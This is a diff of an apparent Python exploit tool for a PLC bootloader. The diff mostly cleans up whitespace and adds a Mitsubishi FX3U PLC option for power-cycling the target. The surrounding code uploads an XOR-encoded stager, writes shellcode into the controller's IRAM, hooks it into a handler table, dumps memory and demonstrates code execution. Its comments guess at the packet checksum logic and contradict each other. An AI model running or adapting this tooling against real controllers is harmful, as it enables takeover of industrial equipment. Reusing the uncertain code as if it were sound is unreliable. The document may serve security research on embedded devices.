@@ -93,18 +93,18 @@ def calc_checksum_byte(incoming_bytes):
     # The first byte (incoming_bytes[0]) is the length of the *rest* of the packet (data + checksum).
     # So the actual data to be checksummed is incoming_bytes[0] bytes starting from incoming_bytes[0] itself if the length byte is included.
     # Or incoming_bytes[1] up to incoming_bytes[0] (exclusive of checksum) if length byte indicates length of data following it.
-    
+
     # The original code: incoming[:ord(incoming[0])]
     # If incoming[0] is length L, it sums L bytes *starting from the first byte*.
     # Example: if incoming = b'\x03ABC', ord(incoming[0]) is 3. It sums b'\x03AB'.
     # This is unusual. Usually, the length byte specifies length of *payload* or *payload+checksum*.
     # Let's stick to the original logic: sum `incoming[0]` bytes starting from `incoming[0]`.
     length_to_sum = incoming_bytes[0]
-    
+
     current_sum = 0
     for i in range(length_to_sum):
         current_sum += incoming_bytes[i]
-        
+
     return struct.pack("<i", -current_sum)[0] # returns an int
 
 
@@ -126,7 +126,7 @@ def send_packet(r, msg_bytes, step=2, sleep_amt=0.01):
     # First we need to pass the length
     # msg_with_len includes the length byte itself, then the original msg_bytes
     msg_with_len = bytes([len(msg_bytes) + 1]) + msg_bytes # +1 for the checksum byte to be added
-    
+
     # Then add the checksum to the packet
     # calc_checksum_byte expects a byte string where the first byte is the length of data to sum (including itself)
     # The length here should be len(msg_bytes) + 1 (for checksum)
@@ -137,7 +137,7 @@ def send_packet(r, msg_bytes, step=2, sleep_amt=0.01):
     # msg = chr(len(msg)+1)+msg -> if msg was "AB", then it becomes "\x03AB" (len("AB")+1 = 3)
     # calc_checksum_byte("\x03AB") -> ord('\x03') is 3. It sums '\x03', 'A', 'B'. This is wrong.
     # The length byte should indicate the length of the *following data* for checksum, or the length of the *payload part*.
-    
+
     # Let's assume the original intent for checksum calculation:
     # The message for checksum is: <Length_of_Payload_itself><PayloadBytes>
     # And the final packet is: <OverallLength><PayloadBytes><ChecksumByte>
@@ -163,7 +163,7 @@ def send_packet(r, msg_bytes, step=2, sleep_amt=0.01):
 
     # Final packet to send
     msg_to_send = data_for_checksum + bytes([checksum])
-    
+
     log.info("sending packet: {}".format(msg_to_send.hex()))
     for i in range(0, len(msg_to_send), step):
         time.sleep(sleep_amt)
@@ -183,11 +183,11 @@ def recv_packet(r):
         log.error("recv_packet: Did not receive length byte.")
         return None
     rem = answ[0] # rem is an int
-    
+
     # The received length 'rem' is the total number of bytes *following* the length byte itself,
     # including the data bytes and the checksum byte.
     # So, we need to read 'rem' more bytes.
-    
+
     received_data = b""
     bytes_to_read = rem
     while bytes_to_read > 0:
@@ -197,13 +197,13 @@ def recv_packet(r):
             return None # Or raise an exception
         received_data += add
         bytes_to_read -= len(add)
-    
+
     # Full packet including the prepended length byte and the checksum byte at the end
     full_packet_with_len = answ + received_data
-    
+
     # The part for checksum validation is full_packet_with_len[:-1]
     # The checksum byte itself is full_packet_with_len[-1] (as an int)
-    
+
     expected_checksum = calc_checksum_byte(full_packet_with_len[:-1]) # Pass the part including its own length field
     actual_checksum = full_packet_with_len[-1]
 
@@ -253,13 +253,13 @@ def encode_packet_for_stager(chunk):
         # Check if key_byte is in chunk or if key is length of chunk + 2 (original logic)
         if key_byte[0] not in chunk and i != (len(chunk) + 2): # chunk is bytes, so key_byte[0] (int) compared with ints in chunk
             log.info("Sending chunk with xor key: 0x{:02x}".format(i))
-            
+
             # XOR each byte in the chunk with the key i
             xored_payload = bytes([b ^ i for b in chunk])
-            
+
             # Prepend the key
             encoded = key_byte + xored_payload
-            
+
             # Original check: if "\xfe\xfe" in encoded: continue
             # This check needs to be on bytes: if b"\xfe\xfe" in encoded: continue
             # if b"\xfe\xfe" in encoded:
@@ -296,7 +296,7 @@ def send_full_msg_via_stager(r, msg_bytes, chunk_size=2, sleep_amt=0.01):
             print("expecting single-byte ack package, got '{}' (len {}) instead".format(hexlify(answ).decode('ascii'), len(answ)))
             # If the ack is truly empty (b""), then this check should be `if answ != b"":` or similar
             # For now, stick to original logic of expecting 1 byte.
-            assert(False) 
+            assert(False)
         if answ == b"\xff": # Check against bytes
             print("[WARNING] Interrupting the sending...")
             return None
@@ -314,7 +314,7 @@ def invoke_primary_handler(r, handler_ind, args="", await_response=True):
     # args should also be bytes
     if not isinstance(args, bytes):
         raise TypeError("args must be bytes for invoke_primary_handler")
-    send_packet(r, payload + args) 
+    send_packet(r, payload + args)
     if await_response:
         return recv_packet(r) # Returns bytes
     else:
@@ -327,7 +327,7 @@ def enter_subproto_handler(r, mode, args=""):
     in the given mode.
     """
     assert(1 <= mode <= len(SUBPROT_80_MODE_MAGICS))
-    
+
     # struct.pack already returns bytes
     packed_args = struct.pack(">H", SUBPROT_80_MODE_MAGICS[mode])
     return invoke_primary_handler(r, 0x80, packed_args) # Returns bytes
@@ -445,7 +445,7 @@ def exploit_write_to_iram(r, tar, contents):
     # The chunk_size for _exploit_write_chunk_to_iram's contents_bytes must be <= MAX_MSG_LEN - 7
     # Original chunk_size = 16. If MAX_MSG_LEN is small (e.g. 16), then 16 > 16-7=9. This would fail.
     # MAX_MSG_LEN is 192-2 = 190. So 16 <= 190-7 = 183. This is fine.
-    chunk_size = 16 
+    chunk_size = 16
     # From here we have a 4 byte alignment so we can do dword writes only
     for i in range(0, len(contents_bytes), chunk_size):
         print("Writing {:04x}/{:04x}".format(i, len(contents_bytes)))
@@ -492,10 +492,10 @@ def invoke_add_hook(r, add_hook_no, args_bytes=b"", await_response=True):
     # expected_arglen, fn_addr = add_handler_entries[add_hook_no]
     #assert(expected_arglen-3==len(args_bytes) or expected_arglen==0xff)
     hook_ind = 0x1c # This is the primary handler index for "invoke additional hook"
-    
+
     # The payload for primary handler 0x1c is <add_hook_no_byte><args_bytes>
     payload_for_invoke = bytes([add_hook_no]) + args_bytes
-    
+
     return invoke_primary_handler(r, hook_ind, payload_for_invoke, await_response) # Returns bytes
 
 
@@ -519,7 +519,7 @@ def _exploit_install_add_hook(r, tar_addr, shellcode_bytes, add_hook_no):
         shellcode_bytes += b"\xff" # Append byte
 
     exploit_write_to_iram(r, tar_addr, shellcode_bytes) # Takes bytes
-    
+
     # Data for add_hook table entry: (length param (2 bytes), function pointer (4 bytes))
     # Original: "\x00\xff"+struct.pack(">I", tar_addr)
     # Length param \x00\xff means arg length check disabled.
@@ -598,7 +598,7 @@ def payload_dump_mem(r, tar_addr, num_bytes, addhook_ind):
     # "A" should be b"A"
     args_for_dump = b"A" + struct.pack(">II", tar_addr, num_bytes)
     answ = invoke_add_hook(r, addhook_ind, args_for_dump) # answ is bytes
-    
+
     log.debug("[payload_dump_mem] answ (len: {}): {}".format(len(answ), hexlify(answ).decode('ascii')))
     assert(answ.startswith(b"Ok")) # Check against bytes
     contents = recv_many(r, verbose=True) # contents is bytes
@@ -623,7 +623,7 @@ def handle_conn(r, action, args):
         # Example: version = b"\x01\x02S123\x00\x00" -> version[2:3] = b"S", version[3:-2] = b"123"
         # bootloaderversion = "S." + ".".join(["49", "50", "51"]) = "S.49.50.51"
         # This assumes the version bytes are ASCII representable or single bytes that can be stringified.
-        
+
         # The original version[2:3] was a single char string. Now it's a single char bytes.
         # version[3:-2] was a string. Now it's bytes. map ord(c) becomes map c for bytes.
         part1 = version[2:3].decode(errors='ignore') # Should be 'S'
@@ -697,10 +697,10 @@ def handle_conn(r, action, args):
         print("[*] Demonstrating Code Execution")
         # No arguments for tictactoe payload
         invoke_add_hook(r, second_addhook_ind, args_bytes=b"", await_response=False)
-        
+
         msg_bytes = b""
         END_TOKEN_BYTES = b"==>" # Token is bytes
-        
+
         while END_TOKEN_BYTES not in msg_bytes:
             current_chunk = recv_packet(r) # current_chunk is bytes
             if current_chunk is None: # Handle error case from recv_packet
@@ -711,7 +711,7 @@ def handle_conn(r, action, args):
                                       # If TicTacToe sends messages line by line, msg_bytes should be reset.
                                       # For now, assume it can be cumulative if END_TOKEN spans packets.
                                       # More likely, msg from recv_packet is one "line" from game.
-            
+
             # Attempt to decode for printing and checking.
             # sys.stdout.write expects string.
             try:
@@ -765,12 +765,22 @@ def main():
                         help="port of powersupply. defaults to 80, can be changed to support ssh port forwarding (for web method)")
     parser.add_argument('--powersupply-delay', dest='powersupply_delay', default=60, type=lambda x: int(x, 0),
                         help="number of seconds to wait before turning on power supply. defaults to 60.")
-    parser.add_argument('--powersupply-method', dest='powersupply_method', default='web', choices=['web', 'arduino'],
-                        help='Method to control the power supply (web or arduino). Default: web.')
+    parser.add_argument('--powersupply-method', dest='powersupply_method', default='web', choices=['web', 'arduino', 'fx3u'],
+                        help='Method to control the power supply (web, arduino, fx3u). Default: web.')
     parser.add_argument('--powersupply-arduino-port', dest='powersupply_arduino_port',
                         help='Serial port for Arduino (e.g., /dev/ttyUSB0). Required if --powersupply-method is arduino.')
     parser.add_argument('--powersupply-baud-rate', dest='powersupply_baud_rate', default=9600, type=int,
                         help='Baud rate for Arduino serial communication. Default: 9600.')
+
+    # FX3U Power Supply Options
+    ps_fx3u_group = parser.add_argument_group('Power Supply Mitsubishi FX3U Options')
+    ps_fx3u_group.add_argument('--powersupply-fx3u-ip', dest='powersupply_fx3u_ip',
+                               help='IP address of the Mitsubishi FX3U PLC (for --powersupply-method fx3u).')
+    ps_fx3u_group.add_argument('--powersupply-fx3u-port', dest='powersupply_fx3u_port', type=lambda x: int(x, 0),
+                               help='Port for MC Protocol on FX3U PLC (for --powersupply-method fx3u). Defaults to 502 if not specified (via switch_power.py).')
+    ps_fx3u_group.add_argument('--powersupply-fx3u-output', dest='powersupply_fx3u_output',
+                               help="Output address on FX3U PLC (e.g., 'Y0') (for --powersupply-method fx3u).")
+
     parser.add_argument('-s', '--stager', dest="stager", type=argparse.FileType('rb'), default=STAGER_PL_FILENAME, # Changed 'r' to 'rb'
                         help='the location of the stager payload')
     parser.add_argument('-c', '--continue', dest='cont', default=False, action='store_true', help="Continue PLC execution after action completed")
@@ -815,13 +825,15 @@ def main():
     if args.powersupply_method == 'arduino' and not args.powersupply_arduino_port:
         parser.error("--powersupply-arduino-port is required when --powersupply-method is arduino")
 
+    # Conditional requirement for FX3U arguments handled within the `if args.switch_power:` block below.
+
     # We are currently using pwntools for the connection as those
     # proved to be reliable. We may want to refactor this.
     s = remote("localhost", args.port)
 
     if args.switch_power:
         print("Turning off power supply using method '{}' and sleeping for {:d} seconds".format(args.powersupply_method, args.powersupply_delay))
-        
+
         # switch_power.py is now python3. Commands are lists of strings, this is fine.
         base_cmd_off = ["tools/powersupply/switch_power.py"]
         base_cmd_on = ["tools/powersupply/switch_power.py"]
@@ -834,7 +846,17 @@ def main():
             arduino_args = ["--method", "arduino", "--arduino-port", args.powersupply_arduino_port, "--baud-rate", str(args.powersupply_baud_rate)]
             base_cmd_off.extend(arduino_args)
             base_cmd_on.extend(arduino_args)
-            
+        elif args.powersupply_method == 'fx3u':
+            if not args.powersupply_fx3u_ip or not args.powersupply_fx3u_output:
+                parser.error("error: --powersupply-fx3u-ip and --powersupply-fx3u-output are required when --powersupply-method is fx3u")
+            fx3u_args = ["--method", "fx3u",
+                         "--fx3u-ip", args.powersupply_fx3u_ip,
+                         "--fx3u-output", args.powersupply_fx3u_output]
+            if args.powersupply_fx3u_port is not None:
+                fx3u_args.extend(["--fx3u-port", str(args.powersupply_fx3u_port)])
+            base_cmd_off.extend(fx3u_args)
+            base_cmd_on.extend(fx3u_args)
+
         cmd_off = base_cmd_off + ["off"]
         cmd_on = base_cmd_on + ["on"]
 
@@ -855,7 +877,7 @@ def main():
         answ = s.recv(256, timeout=0.3) # answ is bytes
         if len(answ) > 0:
             # "\5-CPU" should be b"\5-CPU"
-            if not answ.startswith(b"\x05-CPU"): 
+            if not answ.startswith(b"\x05-CPU"):
                 answ += s.recv(256)
             assert(answ.startswith(b"\x05-CPU")) # Check against bytes
             s.unrecv(answ) # answ is bytes, unrecv should handle it
